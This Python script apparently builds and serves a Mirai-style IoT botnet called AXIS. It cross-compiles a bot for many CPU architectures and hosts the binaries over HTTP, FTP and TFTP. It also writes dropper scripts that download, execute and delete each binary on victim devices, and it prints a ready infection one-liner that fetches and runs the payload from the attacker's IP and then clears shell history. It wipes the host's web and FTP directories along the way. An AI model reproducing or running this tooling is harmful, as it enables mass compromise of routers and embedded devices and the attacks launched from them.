import subprocess, sys
#Made By @i_am_unbekannt.
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("Incorrect Usage!")
    print("Usage: sudo python3 AXIS_CC.py AXIS_CNC.c "+ip)
    exit(1)

bot = sys.argv[1]
print("Install Cross Compilers?")
print("y/n ?")
axis = input(ip+"@Install:~$ ")
if axis == "y":
    get_arch = True
else:
    get_arch = False
#Made By @i_am_unbekannt.
compileas = ["m-i.p-s.AXIS",
             "m-p.s-l.AXIS",
             "s-h.4-.AXIS",
             "x-8.6-.AXIS",
             "a-r.m-6.AXIS",
             "x-3.2-.AXIS",
             "a-r.m-7.AXIS",
             "p-p.c-.AXIS",
             "i-5.8-6.AXIS",
             "m-6.8-k.AXIS",
	    "p-p.c-.AXIS",
             "a-r.m-4.AXIS",
             "a-r.m-5.AXIS"]

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-armv7l",
       "cross-compiler-armv4l",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l"]
#Made By @i_am_unbekannt.
def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")
#Made By @i_am_unbekannt.
num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

run("sudo apt install apache2 -y && sudo service apache2 start")
run("service httpd start")
run("sudo apt install tftp")
run("sudo apt install -y vsftpd")
run("service vsftpd start")
#Made By @i_am_unbekannt.
run('''echo "# default: off
#Made By @i_am_unbekannt.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")
#Made By @i_am_unbekannt.
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")
for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')

run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')

run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
#Made By @i_am_unbekannt.
run('echo "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')

run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')

run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')

run('echo "#!/bin/bash" > /var/www/html/AXIS.sh')

for i in compileas:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/AXIS.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
run("service xinetd restart")
run("service httpd restart")
run('echo "ulimit -n 99999" >> ~/.bashrc')
#Made By @i_am_unbekannt.
print("Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
